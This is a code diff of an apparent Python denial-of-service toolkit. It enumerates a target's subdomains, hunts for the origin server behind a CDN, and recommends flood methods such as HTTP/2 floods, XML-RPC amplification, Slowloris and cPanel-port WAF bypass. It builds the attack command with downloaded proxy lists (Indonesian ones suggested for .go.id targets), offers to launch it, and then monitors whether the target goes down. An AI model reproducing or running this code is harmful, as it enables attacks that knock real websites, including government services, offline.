                     print(f"[*] CRT.SH Found  : {bcolors.OKGREEN}{len(crt_subs)} subdomains{bcolors.RESET}")
-                    # Add to scanning list (clean duplicates later)
                     for sub in crt_subs:
-                        # Extract subdomain part
                         clean = sub.replace(f".{target_domain}", "")
                         common_subs.append(clean)
                 else:
                     print("[*] CRT.SH        : No new subdomains found.")
-            except:
-                print("[*] CRT.SH        : Invalid JSON (Rate Limit?)")
+            except Exception as e:
+                print(f"[*] CRT.SH        : JSON Parse Error {e}")
         else:
             print(f"[*] CRT.SH        : Failed ({r_crt.status_code})")
-            
     except Exception as e:
         print(f"[*] CRT.SH Error  : {e}")
 
-
-        # [PHASE 19 + 20] Zone Hunter + Content Matcher
-        print(f"\n{bcolors.OKCYAN}Phase 5: Zone Hunter & Content Verification...{bcolors.RESET}")
-        
-        # Unique list
-        scan_list = list(set(common_subs))
-        exposed_origin = None
-        
-        # Get Main Site Signature
-        main_sig = 0
-        try:
-            r_main = get_robust_response(target_url)
-            main_sig = len(r_main.content)
-            print(f"[*] Main Site Size : {main_sig} bytes")
-        except:
-            pass
-
-        try:
-            def check_subdomain(sub):
-                sub = sub.strip()
-                if not sub: return None
-                
-                if target_domain in sub: sub_domain = sub 
-                else: sub_domain = f"{sub}.{target_domain}"
-                
-                try:
-                    sub_ip = socket.gethostbyname(sub_domain)
-                    if sub_ip == resolved_ip: return None # Skip same IP (Cloudflare/WAF)
-                    
-                    match_status = f"{bcolors.WARNING}UNVERIFIED{bcolors.RESET}"
-                    is_origin_candidate = False
-                    
-                    try:
-                        # Verify Content with Robust Retry (Low retries for speed)
-                        r_check = get_robust_response(f"http://{sub_domain}", retries=2) 
-                        check_sig = len(r_check.content)
-                        
-                        if main_sig > 0:
-                            ratio = abs(main_sig - check_sig) / main_sig
-                            if ratio < 0.2:
-                                match_status = f"{bcolors.FAIL}CONFIRMED ORIGIN!{bcolors.RESET}"
-                                is_origin_candidate = True
-                            else:
-                                match_status = f"{bcolors.OKCYAN}Content Mismatch{bcolors.RESET}"
-                    except:
-                        match_status = "Dead/Timeout"
-                    
-                    return (sub_domain, sub_ip, match_status, is_origin_candidate)
-                except:
-                    return None
-
-            print(f"[*] Scanning {len(scan_list)} subdomains with 50 threads...")
-            completed = 0
-            total = len(scan_list)
-            
-            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-                futures = [executor.submit(check_subdomain, sub) for sub in scan_list]
-                for future in concurrent.futures.as_completed(futures):
-                    completed += 1
-                    # Progress Bar (Overwritable)
-                    print(f"[*] Scanning Progress: [{completed}/{total}] ...{' '*20}", end="\r")
-                    
-                    result = future.result()
-                    if result:
-                        sub_domain, sub_ip, match_status, is_candidate = result
-                        # clear line before printing result
-                        print(f"{' '*60}", end="\r") 
-                        print(f"[*] Found {sub_domain:<30} : {sub_ip} | {match_status}")
-                        if is_candidate and not exposed_origin:
-                             exposed_origin = sub_domain
-            print(f"[*] Scanning Complete!{' '*40}")
-
-        except Exception as e:
-            print(f"[!] Zone Hunter Error: {e}")
-        except Exception as e:
-            print(f"[!] Zone Hunter Error: {e}")
-
-        # Phase 5: Tactical Recommendation
-        print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
-        
-        rec_method = "H2_FLOOD"
-        reason = "Standard High-Throughput HTTP/2 Attack"
-        cmd_example = f"python3 start.py H2_FLOOD {target_url} 7 100 proxy.txt 50 800"
-
-        if vuln_vector == "XMLRPC":
-            rec_method = "XMLRPC"
-            reason = "CRITICAL: XML-RPC Amplification detected! Most damage per request."
-            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
-        
-        elif exposed_origin:
-            rec_method = "H2_FLOOD (Origin Bypass)"
-            reason = f"EXPOSED ORIGIN FOUND! Attack {exposed_origin} to bypass {cdn_guess}."
-            target_url = f"https://{exposed_origin}"
-            args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
-            
-        elif "Apache" in server_header and cdn_guess == "Unknown":
-            rec_method = "SLOW"
-            reason = "Apache Target without WAF is vulnerable to Slowloris."
-            args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
-        
-        elif 2083 in open_ports or 2087 in open_ports:
-            rec_method = "H2_FLOOD (Backend)"
-            target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
-            reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
-            args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
-            
-        else:
-             args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
-
-
-        cmd_string = f"{sys.executable} start.py {' '.join(args)}"
-
-        print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
-        print(f"Reason : {reason}")
-        print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
-        
-        print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
-        q = input().lower()
-        if q.startswith("y"):
-             cmd = [sys.executable, "start.py"] + args
-             try:
-                subprocess.run(cmd)
-             except Exception as e:
-                print(f"Error: {e}")
-
-        # [PHASE 22] Intel Recorder (Save Report)
-        print(f"\n{bcolors.OKCYAN}[?] Save Intel Report to 'intel_report.txt'? (y/n): {bcolors.RESET}", end="")
-        if input().lower().startswith("y"):
-             try:
-                 with open("intel_report.txt", "a") as f:
-                     f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Target: {target_url}\n")
-                     f.write(f"   IP: {resolved_ip}\n")
-                     f.write(f"   Server: {server_header}\n")
-                     if cdn_guess != "Unknown": f.write(f"   WAF: {cdn_guess}\n")
-                     if open_ports: f.write(f"   Open Ports: {open_ports}\n")
-                     if exposed_origin: f.write(f"   Exposed Origin: {exposed_origin}\n")
-                     if vuln_vector: f.write(f"   Vulnerability: {vuln_vector}\n")
-                     if ssl_sans: f.write(f"   SSL SANs: {', '.join(ssl_sans[:5])}...\n")
-                     f.write(f"   Recommended: {rec_method}\n")
-                     f.write("-" * 40 + "\n")
-                 print(f"{bcolors.OKGREEN}[+] Report Saved!{bcolors.RESET}")
-             except Exception as e:
-                 print(f"{bcolors.FAIL}[!] Failed to save report: {e}{bcolors.RESET}")
-
-    except ImportError:
-         print(f"{bcolors.FAIL}[!] Missing requests library. run 'pip install requests'{bcolors.RESET}")
+    print(f"\n{bcolors.OKCYAN}Phase 5: Zone Hunter & Content Verification (Async)...{bcolors.RESET}")
+    scan_list = [f"{s}.{target_domain}" if target_domain not in s else s for s in list(set(common_subs))]
+    
+    main_sig = 0
+    try:
+        main_sig = len(requests.get(target_url, timeout=5, verify=False).content)
+        print(f"[*] Main Site Size : {main_sig} bytes")
     except Exception as e:
-         print(f"{bcolors.FAIL}[!] Analysis Error: {e}{bcolors.RESET}")
+         print(f"[*] Main Site Size : Failed ({e})")
+
+    exposed_origin = asyncio.run(run_zone_hunter(scan_list, target_domain, resolved_ip, main_sig))
+
+    print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
+    rec_method, reason = "H2_FLOOD", "Standard High-Throughput HTTP/2 Attack"
+
+    if vuln_vector == "XMLRPC":
+        rec_method, reason = "XMLRPC", "CRITICAL: XML-RPC Amplification detected! Most damage per request."
+        args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
+    elif exposed_origin:
+        rec_method, reason = "H2_FLOOD (Origin Bypass)", f"EXPOSED ORIGIN FOUND! Attack {exposed_origin} to bypass {cdn_guess}."
+        target_url = f"https://{exposed_origin}"
+        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
+    elif "Apache" in server_header and cdn_guess == "Unknown":
+        rec_method, reason = "SLOW", "Apache Target without WAF is vulnerable to Slowloris."
+        args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
+    elif 2083 in open_ports or 2087 in open_ports:
+        rec_method, reason = "H2_FLOOD (Backend)", "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
+        target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
+        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
+    else:
+        args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
+
+    if pass_clearance_to_start:
+        reason += " [Clearance Ready]"
+
+    cmd_string = f"{sys.executable} start.py {' '.join(args)}"
+    print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
+    print(f"Reason : {reason}")
+    print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
+    
+    print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
+    if input().lower().startswith("y"):
+        cmd = [sys.executable, "start.py"] + args
+        try:
+            subprocess.run(cmd)
+        except Exception as e:
+            print(f"Error: {e}")
+
+    print(f"\n{bcolors.OKCYAN}[?] Save Intel Report to 'intel_report.txt'? (y/n): {bcolors.RESET}", end="")
+    if input().lower().startswith("y"):
+        try:
+            with open("intel_report.txt", "a") as f:
+                f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Target: {target_url}\n")
+                f.write(f"   IP: {resolved_ip}\n   Server: {server_header}\n")
+                if cdn_guess != "Unknown": f.write(f"   WAF: {cdn_guess}\n")
+                if open_ports: f.write(f"   Open Ports: {open_ports}\n")
+                if exposed_origin: f.write(f"   Exposed Origin: {exposed_origin}\n")
+                if vuln_vector: f.write(f"   Vulnerability: {vuln_vector}\n")
+                f.write(f"   Recommended: {rec_method}\n")
+                f.write("-" * 40 + "\n")
+            print(f"{bcolors.OKGREEN}[+] Report Saved!{bcolors.RESET}")
+        except Exception as e:
+            print(f"{bcolors.FAIL}[!] Failed to save report: {e}{bcolors.RESET}")
 
     print("\nPress Enter to return to menu...")
     input()
@@ -644,107 +552,21 @@ def run_sentinel():
     target = input(f"Enter Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
     print(f"{bcolors.RESET}", end="")
     
-    if not target.startswith("http"):
-        target = "https://" + target
+    if not target.startswith("http"): target = "https://" + target
         
-    print(f"\n{bcolors.BOLD}[*] Monitoring {target}... (Ctrl+C to stop){bcolors.RESET}")
-    print("-" * 50)
-    
-    import requests
-    import urllib3
-    import random
-    urllib3.disable_warnings()
-    
-    # [Stealth Option]
-    use_proxy = False
-    proxies = []
     print(f"\n{bcolors.WARNING}[?] Use Proxies for Monitoring? (y/n): {bcolors.RESET}", end="")
+    use_proxy = False
+    proxy_list = []
     if input().lower().startswith("y"):
-        use_proxy = True
-        
-        # Check if we should refresh the list
-        need_download = True
-        if os.path.exists("proxy.txt"):
-             print(f"{bcolors.OKCYAN}[?] proxy.txt found. Refresh/Replace it? (y/n): {bcolors.RESET}", end="")
-             if not input().lower().startswith("y"):
-                 need_download = False
-        
-        if need_download:
-             print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
-             print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
-             print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
-             print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo)")
-
-             rec = "2" if ".id" in target else "1"
-             p_opt = input(f"{bcolors.BOLD}Select (1/2/3, Rec: {rec}): {bcolors.RESET}").strip()
-             
-             if p_opt == "1":
-                 # Public Mix
-                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > proxy.txt")
-             elif p_opt == "2":
-                 # Indo Only (Using ProxyScrape API for freshness)
-                 print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from API...{bcolors.RESET}")
-                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > proxy.txt")
-             elif p_opt == "3":
-                 # MIXED MODE
-                 print(f"{bcolors.WARNING}[*] Fetching Mixed Proxies (Public + Indo API)...{bcolors.RESET}")
-                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > public.txt")
-                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > indo.txt")
-                 
-                 # Combine properly with Python to avoid OS syntax issues
-                 try:
-                     with open("public.txt", "r", encoding="utf-8", errors="ignore") as f1, \
-                          open("indo.txt", "r", encoding="utf-8", errors="ignore") as f2, \
-                          open("proxy.txt", "w", encoding="utf-8") as out:
-                          
-                         c1 = f1.read()
-                         c2 = f2.read()
-                         out.write(c1 + "\n" + c2)
-                     
-                     print(f"{bcolors.OKGREEN}[+] Combined: {len(c1.splitlines())} Public + {len(c2.splitlines())} Indo{bcolors.RESET}")
-                 except Exception as e:
-                     print(f"{bcolors.FAIL}[!] Merge Error: {e}{bcolors.RESET}")
-
-                 # Cleanup
-                 if os.path.exists("public.txt"): os.remove("public.txt")
-                 if os.path.exists("indo.txt"): os.remove("indo.txt")
-                 if os.path.exists("proxy.txt"):
-                     lines = set()
-                     with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
-                         lines = set(f.read().splitlines())
-                     with open("proxy.txt", "w", encoding="utf-8") as f:
-                         f.write("\n".join(lines))
-                 
-        try:
-            with open("proxy.txt", "r") as f:
-                proxies = [line.strip() for line in f if line.strip()]
-            if not proxies:
-                print(f"{bcolors.FAIL}[!] proxy.txt empty! Using Direct.{bcolors.RESET}")
-                use_proxy = False
-            else:
-                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxies)} proxies.{bcolors.RESET}")
-        except:
-             print(f"{bcolors.FAIL}[!] proxy.txt not found! Using Direct.{bcolors.RESET}")
-             use_proxy = False
-                 
-             # Reload
-             try:
-                 with open("proxy.txt", "r") as f:
-                     proxies = [line.strip() for line in f if line.strip()]
-                 print(f"{bcolors.OKGREEN}[*] Loaded {len(proxies)} proxies.{bcolors.RESET}")
-             except:
-                 print(f"{bcolors.FAIL}[!] Download failed. Using Direct.{bcolors.RESET}")
-                 use_proxy = False
+        use_proxy, proxy_list = ProxyManager.prompt_and_download(target, True)
 
     print(f"\n{bcolors.BOLD}[*] Monitoring {target}... (Ctrl+C to stop){bcolors.RESET}")
     print("-" * 50)
     
-    # Use Full Browser Headers
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
-        'Referer': 'https://www.google.com/',
         'Upgrade-Insecure-Requests': '1'
     }
     
@@ -752,10 +574,9 @@ def run_sentinel():
         while True:
             timestamp = time.strftime('%H:%M:%S')
             try:
-                # Prepare Proxy
                 req_kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
-                if use_proxy and proxies:
-                     p = random.choice(proxies)
+                if use_proxy and proxy_list:
+                     p = random.choice(proxy_list)
                      if "://" not in p: p = f"http://{p}"
                      req_kwargs['proxies'] = {'http': p, 'https': p}
 
@@ -763,23 +584,15 @@ def run_sentinel():
                 r = requests.get(target, **req_kwargs)
                 latency = int((time.time() - start_time) * 1000)
                 
-                status_color = bcolors.OKGREEN
-                if r.status_code >= 500:
-                    status_color = bcolors.FAIL
-                elif r.status_code >= 400:
-                    status_color = bcolors.WARNING
-                elif latency > 1000:
-                   status_color = bcolors.WARNING
-                
+                status_color = bcolors.OKGREEN if r.status_code < 400 else bcolors.WARNING if r.status_code < 500 else bcolors.FAIL
                 print(f"[{timestamp}] Status: {status_color}{r.status_code}{bcolors.RESET} | Time: {latency}ms")
                 
-            except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
-                 # Most likely Proxy issues if proxy is enabled
-                 msg = "TIMEOUT" if not use_proxy else "PROXY LAG"
-                 print(f"[{timestamp}] Status: {bcolors.WARNING}{msg}{bcolors.RESET} | Retrying with new proxy...")
+            except (requests.exceptions.ProxyError, requests.exceptions.Timeout):
+                 msg = "TIMEOUT/PROXY LAG" if use_proxy else "TIMEOUT"
+                 print(f"[{timestamp}] Status: {bcolors.WARNING}{msg}{bcolors.RESET} | Retrying...")
             except requests.exceptions.ConnectionError:
-                 msg = "DOWN" if not use_proxy else "CONN FAIL"
-                 print(f"[{timestamp}] Status: {bcolors.FAIL}{msg}{bcolors.RESET}    | Target or Proxy Unreachable")
+                 msg = "CONN FAIL" if use_proxy else "DOWN"
+                 print(f"[{timestamp}] Status: {bcolors.FAIL}{msg}{bcolors.RESET}    | Unreachable")
             except Exception as e:
                 print(f"[{timestamp}] Status: {bcolors.FAIL}ERROR{bcolors.RESET}   | {e}")
             
